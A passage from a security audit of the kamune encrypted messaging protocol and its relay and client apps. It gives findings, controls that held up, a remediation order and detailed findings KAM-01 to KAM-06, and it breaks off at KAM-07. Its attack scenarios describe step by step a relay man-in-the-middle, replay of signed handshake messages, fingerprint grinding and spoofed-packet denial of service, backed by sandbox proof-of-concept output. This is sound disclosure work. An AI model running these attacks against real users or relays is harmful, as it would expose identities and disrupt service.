- Preconditions: The relay uses the shipped config, which enables the broker on 0.0.0.0:4788 ([REL-23](#rel-23)).
- Steps:
  1. Send 20 spoofed `KBRK\x01\x01` packets per minute with the victim's IP as source. The broker shares the per-IP limiter with TCP, TLS and WS ([REL-07](#rel-07)).
  2. Fill the broker registry with spoofed random-mode REGISTERs ([REL-06](#rel-06)).
  3. On Windows builds, one oversized datagram stops the whole process ([REL-01](#rel-01)).
- Outcome: The victim IP, or a whole CGNAT range, is refused on every relay transport, and P2P rendezvous fails for all users.

### Controls that held up

- **Per-direction session keys.** Each side derives separate C2S and S2C keys with its own salt (handshake.go:110-121, handshake.go:228-239). Reflected frames fail to decrypt.
- **Signature verification against the bound key before use.** `signedSerde.verify` checks against the key bound at Introduction or resume (serde.go:83-102). Introduce is self-signed by design (intro.go:80-85). An HPKE MITM cannot re-sign challenge or session frames because they sit inside the session AEAD.
- **Strict sequencing.** Any gap or duplicate closes the conn and returns `ErrOutOfSync` (transport.go:107-127). Sequence allocation, serialization and the write share one lock (transport.go:158-171).
- **Phase route checks.** Session routes are rejected before establishment and challenge routes after (transport.go:192-201).
- **Challenge echo comparison is constant time** (handshake.go:286).
- **AEAD nonces.** 24-byte nonces come from crypto/rand, and short ciphertext is rejected (internal/enigma/enigma.go:44-58).
- **Handshake field validation.** Salt length, session key length and the base32 alphabet are enforced on remote input (handshake.go:315-336), so a session ID cannot inject a bucket path.
- **Resume token handling.** The signature is checked against the stored peer key, then the 24 h window, and only then is the token consumed (server.go:267-285). Removal runs in one bolt Update with a constant-time compare (pkg/storage/session.go:262-293, internal/engine/bolt_store.go:104-110). The wire rejection reason is constant (resume.go:101). The resumed session ID must match (handshake.go:92-94).
- **Server handshake deadline and panic recovery.** One absolute 30 s deadline covers Exchange through Challenge, and `serve` recovers panics (server.go:131-150, server.go:350).
- **Frame size bounds.** Reads allocate at most a uint16 length (conn.go:84-88). Writes over 65535 bytes are rejected (conn.go:156). relayconn framing enforces its maximum (pkg/relayconn/framing.go:41-43).
- **HPKE channel writes are serialized** by `writeMu` (pkg/exchange/channel.go:65-67).
- **Relay pre-crypto rate limit and PSK compare.** TCP and TLS check the limiter at accept (cmd/relay/internal/handlers/tcp_handler.go:46). WS checks before upgrade (ws_handler.go:34). The PSK compare is constant time (ws_handler.go:149). The TCP accept loop backs off up to 1 s (tcp_handler.go:22-37). [REL-05](#rel-05), [REL-11](#rel-11), [REL-08](#rel-08) weaken the limiter's key, not its placement.
- **Relay session pairing.** Tokens are 16 bytes from crypto/rand (cmd/relay/internal/services/session.go:61). Pairing runs under `sm.mu`, and a paired session rejects a third party (session.go:108-120). `RemoveIfOwner` stops a stale channel from deleting a newer session (session.go:195-209).
- **Broker uses the observed source address** for NOTIFY, not the claimed IP (cmd/relay/internal/broker/broker.go:280-295). Clients drop NOTIFY packets whose source is not the broker (cmd/daemon/broker.go:136-138, cmd/bus/broker.go:177). This stops off-path forgery only when source spoofing is blocked ([RC-05](#rc-05)).
- **At-rest basics.** The bolt file is created 0600 (internal/engine/bolt_store.go:53). The identity key is stored under the DEK (pkg/storage/storage.go:179-181). A wrong passphrase fails closed at unwrap (internal/engine/bolt_store.go:152-155).
- **Bus webview.** No HTML sinks in cmd/bus/frontend/src (grep for `{@html}`, `innerHTML`, `outerHTML`, `insertAdjacentHTML` returns nothing).

### Remediation order

**Fix before the next release**

1. Authenticate the Exchange to the identity layer, or bind the Handshake and challenge transcript to both identity keys and the HPKE material, so a relay cannot read Introduce or ResumeRequest ([KAM-02](#kam-02), [KAM-01](#kam-01), [KAM-27](#kam-27)). Until then, correct RELAY.md "never sees public keys" and SPEC 12.3.
2. Raise fingerprint strength to at least 128 bits for the verification display, and show a hex value that differs per key ([KAM-03](#kam-03), [KAM-26](#kam-26)).
3. Make relay transport carry any kamune frame: call `SetReadLimit` above the largest padded frame on WS clients and size the padding target for relay overhead ([RC-01](#rc-01), [RC-02](#rc-02)). Seal after a successful write, or tear down the channel on write failure ([KAM-06](#kam-06)).
4. Pin trust in Quick mode to the key, not the claimed name. Show the stored name and flag a name mismatch ([BUS-01](#bus-01)). Bound and strip control characters from `Introduce.Name` in core ([KAM-22](#kam-22), [BUS-37](#bus-37), [TUI-07](#tui-07)).
5. Strip ANSI and OSC sequences from all peer text before it reaches the terminal ([TUI-01](#tui-01), [TUI-07](#tui-07), [TUI-15](#tui-15)).
6. Replace the HKDF-only passphrase step with Argon2id, and refuse an empty passphrase unless the user confirms an explicit no-encryption mode ([STO-01](#sto-01), [BUS-12](#bus-12), [BUS-02](#bus-02), [DMN-34](#dmn-34), [TUI-17](#tui-17), [DOC-03](#doc-03)).
7. Stop writing the passphrase to the keychain without opt-in in the daemon ([DMN-01](#dmn-01)), and stop deleting it on any open error in bus ([BUS-07](#bus-07)).
8. Make incognito skip `persistEstablishedSession` in core ([KAM-04](#kam-04)) and fix the nil-storage panic on incognito reconnect ([DMN-05](#dmn-05)).
9. Bound the broker read buffer handling so an oversized datagram does not end `Run` ([REL-01](#rel-01)). Use a separate limiter for broker UDP ([REL-07](#rel-07)).
10. Use one verification prompt per pending request with a cap, and run the verifier against a deadline that matches the prompt or extend the handshake deadline while a prompt is open. Do not store the peer when the handshake has failed ([BUS-15](#bus-15), [DMN-03](#dmn-03), [KAM-07](#kam-07)).
11. Map unknown verification modes to Strict, not Auto-Accept ([BUS-38](#bus-38), [DMN-26](#dmn-26)). Require confirmation for the Ctrl+2 switch ([BUS-13](#bus-13)).

**Fix next**

1. Add accept backoff and a pre-auth connection cap to `Server.ListenAndServe` ([KAM-05](#kam-05)). Answer TUI verify requests outside `stateConnecting` ([TUI-02](#tui-02)).
2. Bound the RelayConn receive buffer ([RC-06](#rc-06)) and the per-session message stores in bus, daemon and TUI ([BUS-04](#bus-04), [DMN-02](#dmn-02), [TUI-09](#tui-09)).
3. Replace static relay and P2P tokens with an ECDH or out-of-band secret, or document them as public and gate them with verification ([RC-04](#rc-04), [DOC-01](#doc-01)). Fix the 32-byte versus 16-byte comparison ([RC-07](#rc-07)). Revoke tokens on removal ([BUS-03](#bus-03), [DMN-07](#dmn-07)) and consume or expire the ECDH pool ([BUS-16](#bus-16), [DMN-09](#dmn-09)).
4. Authenticate broker NOTIFY to the client, for example with a per-registration secret ([RC-05](#rc-05)), and stop rebinding held registrations to a new source ([REL-12](#rel-12)).
5. Rate-limit by the right key: parse only the configured header from trusted proxies ([REL-11](#rel-11)), mask IPv6 to /64 ([REL-08](#rel-08)), cap the per-key slice ([REL-10](#rel-10)), and document CDN deployments with a per-client key ([REL-05](#rel-05)). Add HTTP read and idle timeouts ([REL-09](#rel-09)).
6. Ship a pinnable relay certificate path and drop the identifying CN and TLS 1.2 ([REL-02](#rel-02), [REL-03](#rel-03), [RC-03](#rc-03)). Default scheme-less addresses to wss and show a warning when `insecure=true` comes from an import ([DMN-10](#dmn-10), [BUS-36](#bus-36), [TUI-08](#tui-08)).
7. Sort history by local receive time ([STO-02](#sto-02)).
8. Add AEAD associated data that binds each at-rest record to its bucket and key ([STO-03](#sto-03)). Encrypt or hash chat keys and metadata names ([STO-05](#sto-05)). Treat a missing cipher-metadata key as an error, not a new DB ([STO-09](#sto-09)). Compact or overwrite on delete ([STO-04](#sto-04)).
9. Redact tokens in logs and write exports with mode 0600 ([BUS-21](#bus-21), [DMN-11](#dmn-11)). Escape names in logs ([BUS-37](#bus-37)).
10. Prompt on resume in Strict mode, or document the exception ([KAM-08](#kam-08)).
11. Map RST and mid-frame errors consistently, and treat a mid-frame timeout as fatal ([KAM-13](#kam-13), [KAM-14](#kam-14), [BUS-28](#bus-28)). Close the conn after AEAD or signature failure ([KAM-24](#kam-24)).
12. Fix session tracking so a resumed session replaces the stale one ([BUS-08](#bus-08), [TUI-04](#tui-04)) and so closing the store does not break live sessions ([BUS-09](#bus-09)).

**Track**

1. Resumption token desync after a lost final echo ([KAM-15](#kam-15)) and the fixed 24 h window ([KAM-28](#kam-28)).
2. Off-bucket padding sizes ([KAM-09](#kam-09)).
3. Small-order Ed25519 key rejection ([KAM-23](#kam-23)).
4. Identity oracle in signed resume rejections ([KAM-10](#kam-10)).
5. Lifecycle leaks and cancellation gaps: [KAM-21](#kam-21), [KAM-19](#kam-19), [KAM-12](#kam-12), [KAM-17](#kam-17), [RC-08](#rc-08), [RC-14](#rc-14), [RC-16](#rc-16), [RC-09](#rc-09), [RC-15](#rc-15), [RC-10](#rc-10), [BUS-11](#bus-11), [BUS-10](#bus-10), [BUS-30](#bus-30), [BUS-25](#bus-25), [BUS-32](#bus-32), [BUS-40](#bus-40), [DMN-06](#dmn-06), [DMN-04](#dmn-04), [DMN-29](#dmn-29), [DMN-31](#dmn-31), [DMN-14](#dmn-14), [DMN-15](#dmn-15), [DMN-27](#dmn-27), [DMN-16](#dmn-16), [TUI-05](#tui-05), [TUI-06](#tui-06), [TUI-11](#tui-11), [TUI-12](#tui-12), [TUI-10](#tui-10).
6. Relay hardening: [REL-04](#rel-04) log content, [REL-15](#rel-15), [REL-19](#rel-19) unknown-key rejection, [REL-21](#rel-21), [REL-20](#rel-20), [REL-16](#rel-16), [REL-13](#rel-13) non-root image, [REL-23](#rel-23) broker default off, [REL-14](#rel-14) Origin check, [REL-17](#rel-17).
7. Add a CSP to the bus webview ([BUS-18](#bus-18)).
8. Tests for verifiers, incognito, resume reject paths and handshake failure paths, plus `-race` in CI ([BUS-49](#bus-49), [DMN-38](#dmn-38), [KAM-31](#kam-31), [KAM-30](#kam-30), [KAM-32](#kam-32)).
9. Dependency updates ([KAM-29](#kam-29), [BUS-48](#bus-48)) and build script integrity ([BUS-43](#bus-43), [REL-24](#rel-24)).
10. Documentation drift: [DOC-01](#doc-01) to [DOC-17](#doc-17), plus the README and doc-comment drift merged into [BUS-42](#bus-42), [BUS-43](#bus-43) and [RC-20](#rc-20).

### Review coverage and limits

Covered:

- Source review of the root module (protocol, transport, resumption, serde, storage, enigma, exchange, attest, fingerprint, relayconn and its broker client), cmd/relay (handlers, services, broker, ratelimit, config, run), cmd/daemon, cmd/bus (Go backend and the Svelte components listed in the findings) and cmd/tui.
- Docs: README, SPEC sections 3 to 14, RFC001 to RFC003, RELAY.md, DAEMON.md, and the module READMEs.
- Proof-of-concept tests in private sandbox copies under the session scratchpad. They covered an HPKE MITM that read Introduce and ResumeRequest tokens while sessions completed, relay frame loss over the real relay handlers, WS read limits, handshake failure rates over ws, padding sizes, mid-frame timeout desync, offline passphrase guess cost, at-rest record relocation, deleted-data recovery, daemon incognito panic and message reordering, and relay limiter behavior. The repository was not modified.
- Published advisories for golang.org/x/crypto and npm audit for the bus frontend ([KAM-29](#kam-29), [BUS-48](#bus-48)).

Not covered:

- No live testing against deployed relays, brokers or CDN fronts. CDN and tunnel behavior is derived from code and RELAY.md.
- No audit of third-party dependency internals beyond published advisories, apart from reading the kcp-go v5.6.72 Dial, Listen and Close paths and the coder/websocket read limit. KCP conv and sequence injection by off-path spoofing was not traced in depth.
- Keychain behavior was reasoned about for Linux Secret Service only. macOS and Windows ACLs were not tested.
- The Wails IPC surface was not tested from a hostile page. Bus file-system bindings (SaveCardPNG, SetDBPath, export paths) were only partly reviewed.
- Pre-auth CPU cost of HPKE and ML-KEM per connection was not measured.
- SSD remanence, process memory zeroization and side channels were not tested.
- The emoji second-preimage cost ([KAM-03](#kam-03)) is an estimate from the bit count. No grinding was run.
- The relay-side `CreateWith` squat behavior behind [BUS-01](#bus-01) was confirmed from code signatures and test names in cmd/relay/internal/services, not by an end-to-end run.

## Findings by module

### kamune: core library

Root package (handshake, transport, resumption, server, dialer), internal/box, internal/enigma, internal/clock, pkg/attest, pkg/exchange, pkg/fingerprint.

| ID                | Severity | Category         | Finding                                                                                                                    |
| ----------------- | -------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------- |
| [KAM-01](#kam-01) | Medium   | security         | Introduce, ResumeRequest and ResumeAccept have no nonce, freshness or channel binding and replay across connections        |
| [KAM-02](#kam-02) | Medium   | security         | Unauthenticated HPKE Exchange lets an active relay or on-path attacker read both identities, session IDs and resume tokens |
| [KAM-03](#kam-03) | Medium   | crypto           | 8-emoji fingerprint, the documented verification method, has 52.7 bits of second-preimage resistance                       |
| [KAM-04](#kam-04) | Medium   | privacy          | Incognito mode still writes a session record (peer key, established_at, 20 resumption tokens) that appears in History      |
| [KAM-05](#kam-05) | Medium   | dos              | Server accept loop has no backoff on Accept errors and no cap on pre-auth connections doing KEM work                       |
| [KAM-06](#kam-06) | Medium   | correctness      | exchange.Channel seals before writing, so a failed write desynchronizes the HPKE nonce and silently breaks the channel     |
| [KAM-07](#kam-07) | Medium   | ux-safety        | Verifier prompts wait 2 minutes inside a 30 s handshake deadline; a late Accept stores the peer as trusted                 |
| [KAM-08](#kam-08) | Medium   | spec-drift       | Resumption skips RemoteVerifier, so Strict mode in bus, daemon and TUI does not prompt for resumed sessions                |
| [KAM-09](#kam-09) | Low      | privacy          | Bucketed padding emits off-bucket sizes (target-1, target-2), revealing exact envelope size                                |
| [KAM-10](#kam-10) | Low      | privacy          | Server signs a ResumeAccept for any unauthenticated client, giving an identity-confirmation oracle                         |
| [KAM-11](#kam-11) | Low      | dos              | KCP runs with no FEC and no packet authentication; spoofed UDP creates pre-auth sessions and resets live ones              |
| [KAM-12](#kam-12) | Low      | dos              | Transport.Close can block for about 2 minutes behind a stalled Send                                                        |
| [KAM-13](#kam-13) | Low      | correctness      | A receive timeout in the middle of a frame desyncs the stream, but SPEC 14 calls it non-fatal and all three clients retry  |
| [KAM-14](#kam-14) | Low      | correctness      | Connection resets and mid-frame EOF are not mapped to ErrConnClosed, which bypasses client reconnection                    |
| [KAM-15](#kam-15) | Low      | correctness      | Lost final challenge echo desynchronizes resumption token sets; later resumes always fail                                  |
| [KAM-16](#kam-16) | Low      | correctness      | Transport close re-creates a deleted session bucket                                                                        |
| [KAM-17](#kam-17) | Low      | correctness      | Transport.Close leaves local resumption tokens on disk when the close frame cannot be sent                                 |
| [KAM-18](#kam-18) | Low      | concurrency      | Concurrent Receive calls produce spurious ErrOutOfSync and kill the session                                                |
| [KAM-19](#kam-19) | Low      | concurrency      | Server.Close does not stop or wait for in-flight handshakes and handlers                                                   |
| [KAM-20](#kam-20) | Low      | resource-leak    | Every connection persists a new session record with 20 tokens, so a peer can grow the DB and history list without bound    |
| [KAM-21](#kam-21) | Low      | resource-leak    | NewServer leaks the bound TCP/KCP listener when a later option or Attester() fails                                         |
| [KAM-22](#kam-22) | Low      | input-validation | Remote Introduce name has no length or character limits                                                                    |
| [KAM-23](#kam-23) | Low      | input-validation | Small-order Ed25519 identity keys are accepted; one signature then verifies every message                                  |
| [KAM-24](#kam-24) | Low      | spec-drift       | ReceivePayload leaves the connection open after AEAD or signature failure and after RouteCloseTransport                    |
| [KAM-25](#kam-25) | Info     | correctness      | AppVersion doc says sub-modules may override it in init(), but localSemver is fixed at kamune init                         |
| [KAM-26](#kam-26) | Info     | ux-safety        | Pseudonym listed as a fingerprint format but has 29.6 bits and wrong doc counts                                            |
| [KAM-27](#kam-27) | Info     | spec-drift       | Challenge receiver never recomputes the challenge, so the transcript-hash binding claimed in SPEC is not verified          |
| [KAM-28](#kam-28) | Info     | spec-drift       | Resumption window never resets on resume; fresh tokens expire 24h after the first cold handshake                           |
| [KAM-29](#kam-29) | Info     | build            | golang.org/x/crypto v0.54.0 carries four known advisories in all five modules; none reachable                              |
| [KAM-30](#kam-30) | Info     | build            | Lint and test tooling run a narrow set of checks: govet limited to fieldalignment, no -race, no CI                         |
| [KAM-31](#kam-31) | Info     | test-gap         | Handshake, transport and storage failure paths have no tests; fuzzers only produce validly signed input                    |
| [KAM-32](#kam-32) | Info     | test-gap         | Resume rejection tests reimplement server logic in the wrong order and never run handleResume reject paths                 |

Findings filed elsewhere that also apply here: [RC-02](#rc-02).

#### KAM-01

**Introduce, ResumeRequest and ResumeAccept have no nonce, freshness or channel binding and replay across connections**

Severity: Medium · Category: security

Locations: `intro.go:29-32`, `intro.go:62-94`, `resume.go:26-28`, `resume.go:112-114`, `server.go:194`, `server.go:203` and 10 more

Introduce metadata is {Timestamp, Route}, and the receiver never checks the timestamp. ResumeRequest and ResumeAccept metadata contain only Route (RFC002 R1 lists ID, Timestamp, Sequence, Route). None of these signatures binds to the connection, the HPKE transcript or a peer nonce. Ed25519 is deterministic, so a given (sessionID, token) always yields the same ResumeRequest signature, and every ResumeAccept{Accepted:true} or {false} from a server is byte-identical across sessions and not bound to the request. Any captured blob verifies forever. The dialer sends its Introduce before verifying the server (dial.go:92), so any server it dials, or any relay, obtains a replayable signed Introduce. The server runs the RemoteVerifier and returns its own Introduce before the initiator proves key possession; proof only comes at the Challenge. Client verifiers call StorePeer inside the callback, before key confirmation. SPEC 12.3 says peers are authenticated in the Introduction phase and SPEC 12.6 says sequence numbers prevent replay; sequence checks apply only after the session is established.

**Attack scenario.** Contact-list oracle: Mallory gets Alice to dial her once, or acts as the relay, and stores Alice's Introduce. She connects to Bob's listener, completes HPKE and sends Alice's bytes. A Quick-mode server that knows Alice answers with Bob's Introduce within 1 ms and no prompt; an unknown key blocks on a prompt. Repeating this maps the social graph. In Strict mode Bob gets 'verify Alice' prompts for connections Alice never made, and a replayed unknown key is stored if the user accepts. Resume: a malicious relay withholds each ResumeRequest and replays it to the server on a fresh connection; the server authenticates it, burns the token at server.go:282 and answers Accepted:true. A stored ResumeAccept{false} replayed to the dialer makes it abandon resumption after it already popped a token (dial.go:155), forcing a cold Introduction and a new verifier prompt.

**Recommendation.** Add a random nonce, a timestamp check and the HPKE transcript hash or Export value to the signed metadata of Introduce, ResumeRequest and ResumeAccept, and verify it on receipt. Have the responder send a nonce first and the initiator sign it. Have ResumeAccept sign the request's nonce and session ID. Run verifier side effects (StorePeer) only after the Challenge succeeds. Reword SPEC 12.3 and 12.6 to say authentication completes at the Challenge and replay protection applies only to Transport frames.

<details><summary>Evidence</summary>

```text
intro.go:29-38 `md := &pb.Metadata{Timestamp: timestamppb.Now(), Route: RouteIdentity.ToProto()}` then `at.Sign(signingInput(metadataBytes, message))`
resume.go:26-28 `md := &pb.Metadata{Route: RouteResumeRequest.ToProto()}`
resume.go:112-114 `md := &pb.Metadata{Route: RouteResumeAccept.ToProto()}`
server.go:203-207 `s.handshakeOpts.remoteVerifier(s.storage, peer)` then `sendIntroduction(ec, s.attest, s.serverName, AppVersion)`
cmd/bus/verifier.go:139-142 `store.StorePeer(peer)` inside the verifier.
PoC (sandbox zz_redteam_replay_test.go): `Bob's server answered replayed Alice Introduce after [...]
```

</details>

#### KAM-02

**Unauthenticated HPKE Exchange lets an active relay or on-path attacker read both identities, session IDs and resume tokens**

Severity: Medium · Category: security

Locations: `pkg/exchange/channel.go:106-145`, `pkg/exchange/channel.go:162-204`, `intro.go:16-58`, `intro.go:62-94`, `resume.go:14-54`, `handshake.go:349` and 17 more

exchange.Initiate and exchange.Accept run ephemeral-ephemeral HPKE (MLKEM768-X25519, base mode, empty info) with no long-term key, PSK or out-of-band value. Nothing later binds the HPKE transcript: Introduce is self-signed over {Timestamp, Route} and the Introduce body only (intro.go:29-38, verified at intro.go:81 against the key carried in the message), the Handshake signatures cover only Handshake fields, and handshakeTranscriptHash (handshake.go:349) hashes only the inner Handshake fields. An attacker that terminates HPKE separately with each side can decrypt and re-encrypt every pre-session frame without breaking any signature. The ML-KEM secret still agrees end to end, so the Challenge passes and neither side notices. The attacker reads both Introduce messages (Name, Ed25519 PKIX key, AppVersion), the Handshake fields including both session-ID halves, and on resumption the ResumeRequest {SessionID, Token}. Message content stays protected because the ML-KEM key and ciphertext are signed by the identity keys. Over the relay, kamune frames ride in Frame.Msg and are rebuilt by the hub (hub.go:111-115), so the relay is on-path by design. This contradicts RELAY.md:15 ('the relay never sees public keys, identities'), RELAY.md:31-33 (cannot 'identify peers, or persist identity across sessions'), RELAY.md:48, RELAY.md:67, SPEC 6.1 ('protects the subsequent Introduction and Handshake messages from eavesdropping'), SPEC 6.8.2 and RFC001 ('The raw token value is therefore never sent in the clear'), and the relayconn package doc that calls the client-to-relay HPKE 'end-to-end encryption'. With both raw keys the relay can also compute static relay tokens SHA256(min||max) (pkg/relayconn/token.go:125) and link the same pair across sessions.

**Attack scenario.** Attacker: the relay operator (A3), or an active on-path attacker on direct TCP/KCP or a ws:// or InsecureSkipVerify relay path (A2). 1) Run exchange.Accept toward the dialer and exchange.Initiate toward the listener. 2) Decrypt, log and re-seal the 4 HPKE frames in each direction (Introduce, Handshake, 2 challenge frames). 3) After the challenge the Transport switches to the raw conn (dial.go:136, server.go:223), so forward raw frames. The session completes normally. Several sandbox PoCs reproduced this: the MITM logged both Introduce messages (names, keys, version 0.7.0) and the ResumeRequest token, and both sides logged 'session established' and 'session resumed'. The relay can then build a social graph of keys and names, link reconnections by session ID, compute static tokens, and replay a captured ResumeRequest to burn a token.

**Recommendation.** Bind the Exchange transcript (both HPKE public keys and enc values, or an HPKE Export value from both contexts) into the signing input of Introduce, ResumeRequest and Handshake, and into handshakeTranscriptHash, so a split exchange fails verification. To hide identities from an active relay, use HPKE Auth/PSK mode (for example keyed by the relay token or a known peer key) or a SIGMA-I style order where the responder proves its identity first. Until then, correct RELAY.md, SPEC 6.1, SPEC 6.8.2, SPEC 12.3, RFC001 section 10 and the relayconn package comment to say that only passive observers are excluded.

<details><summary>Evidence</summary>

```text
channel.go:128 `hpke.NewRecipient(remoteEnc, privateKey, kdf, aead, nil)`
channel.go:136 `enc, sender, err := hpke.NewSender(remotePublic, kdf, aead, nil)`
channel.go:175 `enc, sender, err := hpke.NewSender(remotePub, kdf, aead, nil)`
intro.go:29 `md := &pb.Metadata{Timestamp: timestamppb.Now(), Route: RouteIdentity.ToProto()}`
RELAY.md:15 '- **Blind**: the relay never sees public keys, identities, or message content.'
PoC output (sandbox mitm_poc_test.go):
MITM C->S Introduce name="Alice" version="0.7.0" pubkey=302a3005...51fccd
MITM S->C Introduce name="Bob" version="0.7.0" [...]
```

</details>

#### KAM-03

**8-emoji fingerprint, the documented verification method, has 52.7 bits of second-preimage resistance**

Severity: Medium · Category: crypto

Locations: `pkg/fingerprint/emoji.go:23-36`, `pkg/fingerprint/emoji.go:15`, `pkg/fingerprint/emoji.go:20`, `pkg/fingerprint/hex.go:7-21`, `pkg/attest/attest.go:33-34`, `cmd/bus/README.md:143` and 21 more

The emoji fingerprint, which the docs give as the verification method, has 52.7 bits of second-preimage resistance. Emoji() maps SHA-256(PKIX key) to 8 symbols from a 96-entry list. Because HPKE is unauthenticated and Introduce is self-signed, this comparison is the only defense against a MITM. An attacker with about 2^52.7 keygen+hash work can produce an identity key whose emoji matches the target's, and that work is reused for every later first contact with the target. The list also contains the look-alike pair 🔑 and 🗝️. The Hex fallback covers the DER encoding, so its first 35 characters are the constant prefix 30:2A:30:05:06:03:2B:65:70:03:21:00, shown in a 10px field. The comment at emoji.go:24-25 cites a birthday bound, which is the wrong measure for this attack.

**Attack scenario.** An on-path attacker (relay operator or network MITM, see the unauthenticated HPKE finding) learns Alice's and Bob's keys from one observed connection. It grinds K_A' with Emoji(K_A') == Emoji(K_A) and K_B' likewise. On the next first-contact or strict-mode connection it runs two separate handshakes with its own keys. Alice and Bob compare emoji over a phone call, see a match, accept, and the attacker reads and alters all messages.

**Recommendation.** Derive a verification code with at least 112 bits of second-preimage resistance from both identity keys (Signal-style safety numbers, or 20+ emojis), and present it as the primary comparison. Compute Hex over the raw 32-byte Ed25519 key, not the DER. Drop visually similar emojis and post-Unicode-11 entries. Update emoji.go:23-25 and the bus README to state the real bit strength.

<details><summary>Evidence</summary>

```text
emoji.go:24 '// There are 96 distinct emojis, giving 96⁸ ≈ 7.2 quadrillion possible combinations'
emoji.go:26-35
  hash := sha256.Sum256(s)
  l := uint32(len(emojiList))
  for i := range 8 { num := binary.BigEndian.Uint32(hash[offset : offset+4]); emojis[i] = emojiList[num%l] }
bus README.md:143 '2. Compare the emoji fingerprint with the peer through a secure channel'
Sandbox: emoji bits 52.68; der hex prefix 30:2A:30:05:06:03:2B:65:70:03:21:00; BenchmarkXGrind-32 74430 30036 ns/op
```

</details>

#### KAM-04

**Incognito mode still writes a session record (peer key, established_at, 20 resumption tokens) that appears in History**

Severity: Medium · Category: privacy · Also affects: daemon, bus

Locations: `transport.go:218-238`, `server.go:226`, `server.go:307`, `dial.go:138`, `dial.go:188`, `pkg/storage/session.go:137-175` and 37 more

persistEstablishedSession runs after every cold or resumed handshake whenever a Storage is set. It calls PutSessionResumption, which uses sessionMetaEnsure to create sessions/&lt;id&gt;/meta and writes the peer's public key, established_at and 20 resumption tokens. The core has no option to turn this off. Bus and daemon pass their on-disk store to NewServer and NewDialer in every mode and skip only their own CreateSession call in incognito. Every incognito session leaves a durable record naming the peer's key and connection time, returned by ListSessions and ListSessionsByRecent. DAEMON.md says that in incognito 'Session history is not recorded' and 'Accepted peers are not stored'.

Bus and daemon both pass their on-disk store to the core in incognito mode (cmd/bus/network.go:228, 643; cmd/daemon/network.go:237, 672), and DAEMON.md:902-909 says incognito sessions are not recorded. The stored resumption tokens are usable only when the peer was already stored before incognito was turned on, because GetPeer (pkg/storage/session.go:190-216) needs the peer record. The session ID bucket, the encrypted peer key and established_at are written in every case.

**Attack scenario.** A user turns on incognito and chats with a contact. Someone who later obtains the DB (stolen disk plus passphrase, a local reader in no-passphrase mode, or someone at the unlocked app) runs list_sessions and sees the session ID, its time and the contact's Ed25519 key. Sandbox repro: both stores contain `sessions=[BNBFFMZURNB46YWO2AMIYD4D] peerKeyLen=44 established=true tokenBytes=644`.

**Recommendation.** Add ServerOption and DialOption (for example ServeWithoutPersistence / DialWithoutPersistence) that skip persistEstablishedSession, and set them in incognito. Do not let invalidateResumptionTokens create a session namespace that does not exist.

<details><summary>Evidence</summary>

```text
transport.go:218-234: `err := store.PutSessionResumption(t.sessionID, peerKey, t.deriveResumptionTokens(), setEstablished)`
cmd/bus/network.go:680: `if store := a.store(); store != nil && !a.incognito {`
cmd/bus/network.go:643: `dialer, err := kamune.NewDialer(addr, store, a.getVerifier(), opts...)`
DAEMON.md:904-909: "Session history is not recorded / Accepted peers are not stored"
```

</details>

#### KAM-05

**Server accept loop has no backoff on Accept errors and no cap on pre-auth connections doing KEM work**

Severity: Medium · Category: dos

Locations: `server.go:93-109`, `server.go:104`, `server.go:146-157`, `server.go:154`, `pkg/exchange/channel.go:162`, `pkg/exchange/channel.go:175` and 1 more

ListenAndServe starts one goroutine per accepted connection with no limit and no per-source limit. Each connection is held up to the 30 s handshake deadline and, before any authentication, exchange.Accept parses the peer's MLKEM768-X25519 key, runs hpke.NewSender (encapsulation) and generates a KEM key pair. One valid 1216-byte public key can be replayed on every connection, so the attacker's cost is a connect plus a 1218-byte write; server cost was measured at about 615 us per connection (1625/s/core). When Accept fails with anything other than net.ErrClosed, the loop logs at Error level and retries at once. At the fd limit Accept returns EMFILE on every call, so the loop spins at full CPU and writes one log line per iteration. The relay's acceptLoop already backs off from 5 ms to 1 s. On the KCP listener, kcp-go returns errors.WithStack(io.ErrClosedPipe) after Close, which is not net.ErrClosed, so the loop logs 2 to 5 spurious 'accept conn' errors at shutdown.

**Attack scenario.** An unauthenticated client opens connections to a bus, daemon or tui server, each sending a replayed HPKE public key or nothing. Each holds an fd and goroutine for 30 s and costs KEM work. Once RLIMIT_NOFILE is reached, the accept loop spins: sandbox repros logged 182,187 and 234,536 'accept conn' lines per second under low ulimits. Legitimate peers cannot connect and log sinks fill.

**Recommendation.** Back off on temporary Accept errors (5 ms doubling to 1 s, as net/http and the relay do) and rate-limit the log line. Add a configurable semaphore capping concurrent pre-auth handshakes (for example 256) and an optional per-source limiter before exchange.Accept. Treat io.ErrClosedPipe, or a closed flag set by Close, as shutdown. Consider a shorter deadline for the first Exchange message.

<details><summary>Evidence</summary>

```text
server.go:94-103:
	cn, err := s.listener.Accept()
	if err != nil {
		if errors.Is(err, net.ErrClosed) { return nil }
		slog.Error("accept conn", slog.Any("error", err))
		continue
	}
Sandbox (RLIMIT_NOFILE=128): `held 60 idle conns; accept-error log lines in 1s: 182187`
Sandbox (ulimit -n 100): `'accept conn' error logs in ~1s: 234536; first: ... accept4: too many open files`
Sandbox pkg/exchange: `pubkey len=1216; server-side Accept work: 3250 per 2.00017397s => 1625/s/core (615 us each)`
```

</details>

#### KAM-06

**exchange.Channel seals before writing, so a failed write desynchronizes the HPKE nonce and silently breaks the channel**

Severity: Medium · Category: correctness

Locations: `pkg/exchange/channel.go:65-83`, `pkg/relayconn/conn.go:95-104`

WriteBytesWithin calls ch.sender.Seal, which advances the HPKE sequence number, and then ch.conn.WriteBytes. If the write fails (Framing size check, a write deadline, a transient error), the frame is never sent but the counter has moved. The next successful frame uses nonce n+1 while the peer expects n, so Open fails and the peer drops the connection. Nothing marks the channel broken, so the next write returns nil and the caller learns only when the peer disconnects. RelayConn uses this Channel for the whole relay session, so one rejected oversize message becomes a session teardown.

**Attack scenario.** A user sends a 40 KB (bucket-6) message over a TCP relay. Framing rejects it locally. The next ordinary message is accepted locally, then fails HPKE Open at the relay ('message authentication failed'), and the relay's ReadPump closes both peers. A write deadline that fires before any byte is written has the same effect.

**Recommendation.** Check the sealed length (plaintext plus the fixed 16-byte overhead) against the transport limit before calling Seal. After any WriteBytes failure that follows Seal, mark the Channel failed and return a sticky error from every later write.

<details><summary>Evidence</summary>

```text
pkg/exchange/channel.go:74-80:
	encrypted, err := ch.sender.Seal(nil, data)
	...
	if err = ch.conn.WriteBytes(encrypted); err != nil {
		return fmt.Errorf("write encrypted: %w", err)
	}
Sandbox test (writer fails once):
  write 1: write encrypted: transient write failure
  write 2: <nil>
  peer read after failed write: "" err=decrypting: chacha20poly1305: message authentication failed
```

</details>

#### KAM-07

